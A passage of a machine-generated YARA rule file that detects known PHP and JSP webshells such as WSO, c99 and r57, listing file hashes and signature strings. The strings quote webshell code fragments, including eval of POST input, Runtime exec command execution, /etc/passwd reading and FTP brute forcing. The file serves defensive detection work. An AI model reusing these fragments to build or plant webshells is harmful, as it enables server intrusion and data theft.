      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash3 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash4 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash5 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash6 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash7 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "public String DBExecute(String sql) {" fullword ascii
      $s2 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s3 = "public String exeCmd(String cmd) {" fullword ascii
      $s4 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s5 = "// end of the login form" fullword ascii
      $s6 = "public boolean DBConnect(String User, String Password) {" fullword ascii
      $s7 = "// show the login form" fullword ascii
      $s8 = "session.setMaxInactiveInterval(_sessionOutTime * 60);" fullword ascii
      $s9 = "public String saveAs(String path, String curUri, String fileContent) {" fullword ascii
      $s10 = "public String getExtName(String fileName) {" fullword ascii
      $s11 = "// end of printing command form" fullword ascii
      $s12 = "public String getFileNameByPath(String path) {" fullword ascii
      $s13 = "public String saveFile(String path, String curUri, String fileContent) {" fullword ascii
      $s14 = "// print the command form" fullword ascii
      $s15 = "private Connection _dbConnection = null;" fullword ascii
      $s16 = "out.println(\"var selectedType = \\\"\" + dbType + \"\\\";\");" fullword ascii
      $s17 = "\\\" onclick=\\\"javascript:saveAs()\\\" /></td>\\n\";" fullword ascii
      $s18 = "private int _sessionOutTime = 20;" fullword ascii
      $s19 = "public String uploadFile(ServletRequest request, String path, String curUri) {" fullword ascii
      $s20 = "\\\"\" + path + \"\\\"</font>\";" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_ng_wso_106 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso-ng.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash12 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
      hash13 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);" fullword ascii
      $s2 = "$temp = @file($_POST['dict']);" fullword ascii
      $s3 = "$temp = ob_get_clean();" fullword ascii
      $s4 = "$ow = @posix_getpwuid(@fileowner($dirContent[$i]));" fullword ascii
      $s5 = "$n = count($dirContent);" fullword ascii
      $s6 = "$type = @mime_content_type($_POST['p1']);" fullword ascii
      $s7 = "$gr = @posix_getgrgid(@filegroup($dirContent[$i]));" fullword ascii
      $s8 = "cmds.pop();" fullword ascii
      $s9 = "cmds.push(cmd);" fullword ascii
      $s10 = "document.cf.cmd.value = cmds[cur];" fullword ascii
      $s11 = "$tmp = ob_get_clean();" fullword ascii
      $s12 = "echo strlen($temp), \"\\n\", $temp;" fullword ascii
      $s13 = "echo \"<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>\";" fullword ascii
      $s14 = "$server = explode(\":\", $_POST['server']);" fullword ascii
      $s15 = "$fp = @fopen($_POST['p1'], \"r\");" fullword ascii
      $s16 = "$db->selectdb($_POST['sql_base']);" fullword ascii
      $s17 = "eval($_POST['p1']);" fullword ascii
      $s18 = "$_POST['p1'] = 'query';" fullword ascii
      $s19 = "$host = explode(':', $host);" fullword ascii
      $s20 = "$uid = @posix_getpwuid(@fileowner($_POST['p1']));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _up_up_win32_107 {
   meta:
      description = "webshell - from files up.jsp, up_win32.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7439d1c0b9994b74db771d9568e3b845630e3497aab71f12cc3af954e7522e45"
      hash2 = "dda9e7e898e8f973a0a16c576789337caf7da2f9303936de5b062e98966e50a0"
   strings:
      $s1 = "long l = contentsize.longValue() - ROUGHSIZE; " fullword ascii
      $s2 = "out.println(\"FileName: \" + newfile.getName());" fullword ascii
      $s3 = "public String getBoundary(HttpServletRequest request,Properties prop) throws ServletException,IOException{" fullword ascii
      $s4 = "Long contentsize = new Long(prop.getProperty(\"content-length\",\"0\"));" fullword ascii
      $s5 = "public String getFileName(String secondline){" fullword ascii
      $s6 = "while((c = fin.read()) != -1){" fullword ascii
      $s7 = "while((c=fin.read()) != -1 ){" fullword ascii
      $s8 = "out.println(\"FileSize: \" + newfile.length());" fullword ascii
      $s9 = "fin.read(b,0,(int)l);" fullword ascii
      $s10 = "fin.read(b,0,1024);" fullword ascii
      $s11 = "fin.read(); " fullword ascii
      $s12 = "fin.read();  " fullword ascii
      $s13 = "if(\"content-type\".equalsIgnoreCase(header) ){" fullword ascii
      $s14 = "if(contentsize.longValue() < 1L ){" fullword ascii
      $s15 = "String secondline = st.getBuffer().toString();" fullword ascii
      $s16 = "<form name=\"test\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
      $s17 = "String tboundary = st.getBuffer().toString();" fullword ascii
      $s18 = "String header = (String)enum.nextElement();" fullword ascii
      $s19 = "ServletInputStream fin =  request.getInputStream();" fullword ascii
      $s20 = "Enumeration enum = request.getHeaderNames();" fullword ascii
   condition:
      ( uint16(0) == 0x6a3c and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_SnIpEr_SA_Shell_108 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, SnIpEr_SA Shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
   strings:
      $s1 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }" fullword ascii
      $s2 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail\")" fullword ascii
      $s3 = "if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }" fullword ascii
      $s4 = " if(!$connection) { err(3); $_POST['cmd'] = \"\"; }" fullword ascii
      $s5 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s6 = "echo sr(15,\"<b>\".$lang[$language.'_text116'].$arrow.\"</b>\",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST" ascii
      $s7 = " echo \"<textarea cols=65 rows=10 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABASES;\\nSELECT " ascii
      $s8 = "echo ws(3).@getenv(\"USERNAME\").\"<br>\";" fullword ascii
      $s9 = "else echo ws(3).\"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid().\"<br>\";" fullword ascii
      $s10 = "  if(empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s11 = "   if($_POST['cmd']==\"ftp_file_down\") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\\\'):('/'))" ascii
      $s12 = "st8_file1']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));" fullword ascii
      $s13 = " $euserinfo  = @posix_getpwuid(@posix_geteuid());" fullword ascii
      $s14 = "  if(empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s15 = "if(copy(\"compress.zlib://\".$snn, $temp)){" fullword ascii
      $s16 = " $_COOKIE = &$HTTP_COOKIE_VARS;" fullword ascii
      $s17 = "<script language=\\'javascript\\'>" fullword ascii
      $s18 = "$u1p=$_POST['snn'];" fullword ascii
      $s19 = "  document.getElementById(id).style.display = \\'block\\';" fullword ascii
      $s20 = " $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],\"From: \".$_POST['from'].\"\\r\\n\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_spy_2011_2013_109 {
   meta:
      description = "webshell - from files angel.php, spy.php, 2011.php, 2013.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash3 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash4 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
   strings:
      $s1 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s2 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s3 = "secparam('HDD space', execute('df -h'));" fullword ascii
      $s4 = "secparam('OS Version',execute('ver'));" fullword ascii
      $s5 = "secparam('User Accounts',execute('net user'));" fullword ascii
      $s6 = "secparam('Account Settings',execute('net accounts'));" fullword ascii
      $s7 = "<td><span style=\"float:right;\"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group." ascii
      $s8 = "secparam('OS version', @file_get_contents('/proc/version'));" fullword ascii
      $s9 = "secparam('Distr name', @file_get_contents('/etc/issue.net'));" fullword ascii
      $s10 = ")';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s11 = "if ($_COOKIE['loginpass'] != $pass) {" fullword ascii
      $s12 = "$tabledump = '';" fullword ascii
      $s13 = "secparam('Mount options', @file_get_contents('/etc/fstab'));" fullword ascii
      $s14 = "secparam('Userful', implode(', ',$temp));" fullword ascii
      $s15 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
      $s16 = "secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? \"yes\" : 'no');" fullword ascii
      $s17 = "var src = e?e.target:event.srcElement;" fullword ascii
      $s18 = "} elseif(function_exists('exec')) {" fullword ascii
      $s19 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');" fullword ascii
      $s20 = "secparam('Danger', implode(', ',$temp));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _index_bak1_ma__1__JSP_ROOTtows_indexop_jsp__edit_ot_zval_t_w_Customize_maint_ver008_ice_info_index_sys_110 {
   meta:
      description = "webshell - from files index_bak1.jsp, ma (1).jsp, JSP.jsp, ROOTtows.jsp, indexop.jsp..jsp, edit_ot.jsp, zval.jsp, t.jsp, w.jsp, Customize.jsp, maint.jsp, ver008.jsp, ice.jsp, info.jsp, index_sys.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f9eb64c48791e1ee5226c6ef0e733b75240721a099fff860c7e2f28e5191c906"
      hash2 = "79b827d25ac28bec5256f09dcfebfcd66960e6953a0d6157a9413f980e6ff38f"
      hash3 = "565c4c6aafcd1e1d4a98db793e8122302713c5944efbf96f56a861399746400b"
      hash4 = "f7189627975054f5a9b51e103b7a4771971e178e865ddf29445bd104e0f121fe"
      hash5 = "45be2bd8db15a97e482f2fe0b36e1e1b44ba9ce34929f5755cedeafbff6360b2"
      hash6 = "6a844c3cafbf8f2427cf90ce28a27242b1710d2cfb37b8181ce5f9fc3a7a2cdb"
      hash7 = "a5b30ad841ac37b37d34a25036457f80b21692a77ede840c082a7121755a426d"
      hash8 = "0dbc21d0e98041b57fb1f5cbcea35bb00c72c883d4326febb1199c866fa75749"
      hash9 = "64e69b73c3ed42bf910b85c22cbb7a1c8ce5db7f64ff7427362e6c6e740dbe1a"
      hash10 = "37132d9bd0c29634e01cd9a951ef5d09dac1755814e4c55eb22f58a3e47e2719"
      hash11 = "27127178ffdadbfe6cc39c4df3130b3f029f22ed14e721f8f89614e1427a46fd"
      hash12 = "7630bd7c4a9dde3b522ec224373edc1a90b6e926ff97e2b56d5dbc6eb78b25ed"
      hash13 = "8947bcb8e9b46559b7844800b82792bcb1ebcb3e7bb5f73a620fb0154f6d46f6"
      hash14 = "81d326f91848ee3eb808f9040163966b05aafb68eb2834d067ce7eea9d8ed3eb"
      hash15 = "ddf0b2fb4c9c4799d86a7fd3860f94ba26b4c47084f283b4b84309bdb4f618b7"
   strings:
      $s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[3]);ResultSetMetaData d=r.getMetaData()" ascii
      $s3 = "try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i<=n;i++){sb.append(d.get" ascii
      $s4 = "try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i<=n;i++){sb.append(d.get" ascii
      $s5 = "catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s6 = "java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}" fullword ascii
      $s7 = "Connection c=DriverManager.getConnection(x[1].trim());if(x.length>2){c.setCatalog(x[2].trim());}return c;}" fullword ascii
      $s8 = "HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];" fullword ascii
      $s9 = "String cs=request.getParameter(\"z0\")+\"\";request.setCharacterEncoding(cs);response.setContentType(\"text/html;charset=\"+cs);" ascii
      $s10 = "void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();" fullword ascii
      $s11 = "os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((\"|\"+\"<-\").getBytes(),0,3)" ascii
      $s12 = "void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={\"TABLE\"};ResultSet r=c.getMetaData().getTable" ascii
      $s13 = "void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={\"TABLE\"};ResultSet r=c.getMetaData().getTable" ascii
      $s14 = "MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(\"N\")){NN(z1,sb);}else if(Z.equals(\"O\")){OO(z1,sb);}" fullword ascii
      $s15 = "os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((\"|\"+\"<-\").getBytes(),0,3)" ascii
      $s16 = "SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0;i<l.length;i++){dt=new java.util.Date(l[i].lastMod" ascii
      $s17 = "SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0;i<l.length;i++){dt=new java.util.Date(l[i].lastMod" ascii
      $s18 = "for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+\" (\"+d.getColumnTypeName(i)+\")\\t\");}r.close();m.close()" ascii
      $s19 = "{os.write((h.indexOf(d.charAt(i))<<4|h.indexOf(d.charAt(i+1))));}os.close();}" fullword ascii
      $s20 = "else{sF+=l[i].getName()+\"\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\";}}sb.append(sF);}" fullword ascii
   condition:
      ( ( uint16(0) == 0x3d74 or uint16(0) == 0x253c or uint16(0) == 0x3f3c ) and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99v2_c99shell_c99_w4cking_Shell__ci___Biz_was_here_c99_locus7s_c99_111 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99v2.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash4 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash5 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash6 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash7 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "     echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with lo" ascii
      $s2 = "  $sqlquicklaunch[] = array(\"Processes\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspecial" ascii
      $s3 = "></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td>" ascii
      $s4 = "[\".htmlspecialchars($name).\"]\\\"><option value=\\\"\\\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT" ascii
      $s5 = "$DISP_SERVER_SOFTWARE = str_replace(\"PHP/\".phpversion(),\"<a href=\\\"\".$surl.\"act=phpinfo\\\" target=\\\"_blank\\\"><b><u>P" ascii
      $s6 = "  $sqlquicklaunch[] = array(\"Server-status\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspe" ascii
      $s7 = "  $sqlquicklaunch[] = array(\"Index\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspecialchar" ascii
      $s8 = "  $sqlquicklaunch[] = array(\"Server variables\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".html" ascii
      $s9 = "     if ($dbms == \"mysql\") {echo \"<a href=\\\"\".$surl.\"act=sql&sql_server=\".htmlspecialchars($dbhost).\"&sql_login=\".html" ascii
      $s10 = "       echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesize" ascii
      $s11 = "     echo \"<b>File:</b>&nbsp;<input type=\\\"text\\\" name=\\\"sql_dump_file\\\" value=\\\"\".$tmp.\"\\\" size=\\\"\".(strlen($" ascii
      $s12 = "ars($sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=serverstat" ascii
      $s13 = "lchars($sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=serverv" ascii
      $s14 = "     if (!empty($kill)) {$query = \"KILL \".$kill.\";\"; $result = mysql_query($query, $sql_sock); echo \"<b>Killing process #\"" ascii
      $s15 = "rs($dbuser).\"&sql_passwd=\".htmlspecialchars($dbpasswd).\"&sql_port=3306&sql_db=\".htmlspecialchars($dbname).\"\\\"><b><u>Conne" ascii
      $s16 = "   echo \"<b>HEXDUMP:</b><nobr> [<a href=\\\"\".$surl.\"act=f&f=\".urlencode($f).\"&ft=info&fullhexdump=1&d=\".urlencode($d).\"" ascii
      $s17 = "   elseif ($sql_act == \"tbldump\") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);" ascii
      $s18 = "if (get_magic_quotes_gpc()) {if (!function_exists(\"strips\")) {function strips(&$arr,$k=\"\") {if (is_array($arr)) {foreach($ar" ascii
      $s19 = "    $fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r\\nTotal time (secs.): \".$ftpquick_t.\"\\r\\nTo" ascii
      $s20 = "ions: \".$i.\"\\r\\nSuccess.: \".$success.\"\\r\\nUnsuccess.:\".($i-$success).\"\\r\\nConnects per second: \".round($i/$ftpquick" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell_SnIpEr_SA_Shell_r57_Mohajer22_112 {
   meta:
      description = "webshell - from files r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $s2 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s3 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s4 = "ox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $s5 = "echo sr(35,\"<b>\".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow.\"</b>\",in('text','mysql_l',15,(!empty($_" ascii
      $s6 = "echo $te.\"<div align=center id='n'><textarea cols=55 rows=1 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(" ascii
      $s7 = "if(isset($_GET['users']))" fullword ascii
      $s8 = "  $extra = \"-C \".$_POST['test5_file'].\" -X /tmp/mb_send_mail\";" fullword ascii
      $s9 = "HOW DATABASES; SELECT * FROM user; SELECT version(); select user();\")).\"</textarea><br>\".in('submit','submit',0,$lang[$langua" ascii
      $s10 = "ver']):(\"localhost\"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):(\"3306\"))));" fullword ascii
      $s11 = "      if(@ociexecute($this->res))" fullword ascii
      $s12 = "echo sr(35,\"<b>\".$lang[$language.'_text111'].$arrow.\"</b>\",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db" ascii
      $s13 = "echo sr(35,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql" ascii
      $s14 = "]):(\"mysql\"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"))));" fullword ascii
      $s15 = "\"password\"))));" fullword ascii
      $s16 = "['mysql_l'])?($_POST['mysql_l']):(\"root\"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p'])" ascii
      $s17 = "  return $users;" fullword ascii
      $s18 = " var $dump;" fullword ascii
      $s19 = " if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id=\"'.$id.'\" style=\"display: none;\">';" fullword ascii
      $s20 = "      $this->dump[]  = '## under construction';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _job_ma4_2_520_113 {
   meta:
      description = "webshell - from files job.jsp, ma4.jsp, 2.jsp, 520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash2 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash3 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash4 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
   strings:
      $s1 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
      $s2 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
      $s3 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
      $s4 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + (files[n].isDirectory() ? \"&lt;dir&gt;\" : \"\") + ((! files[n].isDirectory()) " ascii
      $s5 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
      $s6 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
      $s7 = "<td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getName() + \"" ascii
      $s8 = "<td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getName() + \"" ascii
      $s9 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
      $s10 = "<form name=\\\"fileList\\\" method=\\\"post\\\" action=\\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=deleteFile\" + \"" ascii
      $s11 = "<form name=\\\"openfile\\\" method=\\\"post\\\" action=\\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=save\" + \"\\\">\\n" ascii
      $s12 = "<td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getName() + \"" ascii
      $s13 = "<td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathConvert(files" ascii
      $s14 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
      $s15 = "(getExtName(files[n].getPath())) ? \"<<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"&fsAction=op" ascii
      $s16 = "<td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getName() + \"" ascii
      $s17 = "&nbsp;<a href=\\\"\" + curUri + \"&curPath=\" + (curFile.getParent() == null ? \"\" : pathConvert(curFile.getParent())) + \"\\\"" ascii
      $s18 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
      $s19 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
      $s20 = "<td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathConvert(files" ascii
   condition:
